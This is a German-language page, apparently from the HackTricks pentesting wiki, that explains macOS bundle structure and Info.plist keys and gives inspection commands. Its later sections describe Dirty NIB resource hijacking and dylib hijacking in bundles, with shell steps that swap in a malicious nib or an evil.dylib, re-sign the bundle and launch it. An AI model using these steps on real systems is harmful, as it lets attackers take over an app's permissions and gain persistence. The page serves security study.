# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Bundles dienen in macOS als Container für verschiedene Ressourcen, darunter Anwendungen, Bibliotheken und andere benötigte Dateien. Dadurch erscheinen sie im Finder als einzelne Objekte, beispielsweise die bekannten `*.app`-Dateien. Das am häufigsten anzutreffende Bundle ist das `.app`-Bundle, obwohl auch andere Typen wie `.framework`, `.systemextension` und `.kext` weit verbreitet sind.

### Wesentliche Komponenten eines Bundles

Innerhalb eines Bundles, insbesondere im Verzeichnis `<application>.app/Contents/`, befinden sich verschiedene wichtige Ressourcen:

- **\_CodeSignature**: In diesem Verzeichnis werden Code-Signing-Details gespeichert, die für die Überprüfung der Integrität der Anwendung erforderlich sind. Die Code-Signing-Informationen können mit Befehlen wie den folgenden eingesehen werden:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Enthält die ausführbare Binärdatei der Anwendung, die bei einer Benutzerinteraktion ausgeführt wird.
- **Resources**: Ein Repository für die Benutzeroberflächenkomponenten der Anwendung, einschließlich Bildern, Dokumenten und Schnittstellenbeschreibungen (nib/xib-Dateien).
- **Info.plist**: Dient als zentrale Konfigurationsdatei der Anwendung und ist entscheidend dafür, dass das System die Anwendung ordnungsgemäß erkennt und mit ihr interagiert.

#### Wichtige Schlüssel in Info.plist

Die Datei `Info.plist` bildet einen zentralen Bestandteil der Anwendungskonfiguration und enthält Schlüssel wie:

- **CFBundleExecutable**: Gibt den Namen der ausführbaren Hauptdatei im Verzeichnis `Contents/MacOS` an.
- **CFBundleIdentifier**: Liefert eine globale Kennung für die Anwendung, die von macOS umfassend für die Anwendungsverwaltung verwendet wird.
- **LSMinimumSystemVersion**: Gibt die mindestens erforderliche macOS-Version an, unter der die Anwendung ausgeführt werden kann.

### Bundles untersuchen

Um den Inhalt eines Bundles wie `Safari.app` zu untersuchen, kann der folgende Befehl verwendet werden: `bash ls -lR /Applications/Safari.app/Contents`

Diese Untersuchung zeigt Verzeichnisse wie `_CodeSignature`, `MacOS` und `Resources` sowie Dateien wie `Info.plist`. Jede davon erfüllt einen spezifischen Zweck, von der Absicherung der Anwendung bis zur Definition ihrer Benutzeroberfläche und Betriebsparameter.

#### Zusätzliche Bundle-Verzeichnisse

Neben den üblichen Verzeichnissen können Bundles auch Folgendes enthalten:

- **Frameworks**: Enthält die im Bundle enthaltenen Frameworks, die von der Anwendung verwendet werden. Frameworks ähneln dylibs, verfügen jedoch über zusätzliche Ressourcen.
- **PlugIns**: Ein Verzeichnis für Plug-ins und Erweiterungen, die die Fähigkeiten der Anwendung erweitern.
- **XPCServices**: Enthält XPC-Services, die von der Anwendung für die Out-of-Process-Kommunikation verwendet werden.

Diese Struktur stellt sicher, dass alle erforderlichen Komponenten innerhalb des Bundles gekapselt sind, und ermöglicht eine modulare und sichere Anwendungsumgebung.

Ausführlichere Informationen zu `Info.plist`-Schlüsseln und ihrer Bedeutung bietet die Apple-Entwicklerdokumentation: [Apple-Referenz zu Info.plist-Schlüsseln](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).<sup>[[3]](#references)</sup>

## Sicherheitshinweise und Abuse-Vektoren

- **Gatekeeper / App Translocation**: Wenn ein Quarantäne-Bundle zum ersten Mal ausgeführt wird, führt macOS eine umfassende Signaturprüfung durch und kann es von einem zufällig gewählten translozierten Pfad ausführen. Nach der Akzeptierung werden bei späteren Starts nur oberflächliche Prüfungen durchgeführt; Ressourcendateien in `Resources/`, `PlugIns/`, nibs usw. wurden in der Vergangenheit nicht überprüft. Seit macOS 13 Ventura wird beim ersten Start eine umfassende Prüfung erzwungen, und die neue TCC-Berechtigung *App Management* beschränkt Prozesse von Drittanbietern ohne Zustimmung des Benutzers daran, andere Bundles zu verändern. Ältere Systeme bleiben jedoch anfällig.
- **Kollisionen bei Bundle-Identifiern**: Mehrere eingebettete Targets (PlugIns, Hilfsprogramme), die denselben `CFBundleIdentifier` wiederverwenden, können die Signaturvalidierung beeinträchtigen und gelegentlich URL-Scheme-Hijacking oder -Verwechslungen ermöglichen. Sub-Bundles sollten immer aufgelistet und eindeutige IDs überprüft werden.

## Resource Hijacking (Dirty NIB / NIB Injection)

Vor Ventura konnte das Austauschen von UI-Ressourcen in einer signierten Anwendung die oberflächliche Code-Signing-Prüfung umgehen und code execution mit den Entitlements der Anwendung ermöglichen. Aktuelle Forschung (2024) zeigt, dass dies weiterhin auf Systemen vor Ventura und bei nicht unter Quarantäne gestellten Builds funktioniert:<sup>[[1]](#references)[[2]](#references)</sup>

1. Zielanwendung an einen beschreibbaren Speicherort kopieren (z. B. `/tmp/Victim.app`).
2. `Contents/Resources/MainMenu.nib` (oder ein beliebiges in `NSMainNibFile` angegebenes nib) durch ein bösartiges nib ersetzen, das `NSAppleScript`, `NSTask` usw. instanziiert.
3. Anwendung starten. Das bösartige nib wird unter der Bundle-ID und mit den Entitlements des Opfers ausgeführt (TCC-Berechtigungen, Mikrofon/Kamera usw.).
4. Ventura+ wirkt dem entgegen, indem das Bundle beim ersten Start umfassend überprüft wird und für spätere Änderungen die Berechtigung *App Management* erforderlich ist. Dadurch wird Persistence erschwert, Angriffe beim ersten Start auf älteren macOS-Versionen bleiben jedoch weiterhin möglich.<sup>[[1]](#references)</sup>

Minimales Beispiel für eine bösartige nib-Payload (xib mit `ibtool` zu nib kompilieren):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking innerhalb von Bundles

Da `@rpath`-Lookups gebündelte Frameworks/PlugIns bevorzugen, kann das Ablegen einer schädlichen Library in `Contents/Frameworks/` oder `Contents/PlugIns/` die Ladereihenfolge umleiten, wenn das Haupt-Binary ohne Library Validation oder mit einer schwachen `LC_RPATH`-Reihenfolge signiert wurde.

Typische Schritte beim Ausnutzen eines unsignierten/ad-hoc Bundles:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Hinweise:
- Eine Hardened runtime ohne `com.apple.security.cs.disable-library-validation` blockiert Third-Party-dylibs; prüfe zuerst die Entitlements.
- XPC-Services unter `Contents/XPCServices/` laden häufig benachbarte Frameworks – patche ihre Binaries auf ähnliche Weise für Persistence- oder Privilege-Escalation-Pfade.

## Schnellübersicht zur Inspektion
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referenzen

- [1] [Prozessinjektion ins Blickfeld rücken: Ausnutzen von macOS-Apps mithilfe von nib-Dateien (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & Bundle-Ressourcen-Manipulation – technische Analyse (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer – Referenz der Apple-Info.plist-Schlüssel](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)

{{#include ../../../banners/hacktricks-training.md}}
